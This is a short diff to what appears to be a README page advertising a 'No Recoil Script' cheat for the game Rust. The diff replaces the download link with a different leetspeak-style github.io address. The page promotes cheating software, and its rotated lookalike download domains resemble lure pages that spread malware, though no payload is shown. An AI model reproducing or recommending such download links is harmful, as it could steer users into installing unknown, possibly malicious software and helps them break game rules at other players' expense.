@@ -3,7 +3,7 @@
 Set up the **No Recoil Script** for **Rust** on PC. This technical guide explains how to control spray drift, adjust recoil patterns, and optimize weapon handling for consistent accuracy in any combat situation.
 
 ⬇️ **Download**  
-[![Download Recoil Script](https://img.shields.io/badge/Download-Recoil_Script-000000?style=for-the-badge&logo=rust&logoColor=white)](https://rustrecoilscripto0inf0.github.io/.github/)
+[![Download Recoil Script](https://img.shields.io/badge/Download-Recoil_Script-000000?style=for-the-badge&logo=rust&logoColor=white)](https://1rustn0recoilscr1ptweb0.github.io/.github/)
 
 ---
 
